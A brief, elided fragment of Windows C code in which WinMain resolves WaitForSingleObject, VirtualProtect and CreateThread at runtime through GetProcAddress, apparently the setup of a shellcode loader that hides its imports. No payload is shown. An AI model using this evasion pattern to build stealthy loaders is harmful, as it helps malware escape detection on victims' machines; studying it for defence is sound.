...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
	...
	WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "WaitForSingleObject");
	VirtualProtect_t pVirtualProtect = (VirtualProtect_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "VirtualProtect");
	CreateThread_t pCreateThread = (CreateThread_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "CreateThread");
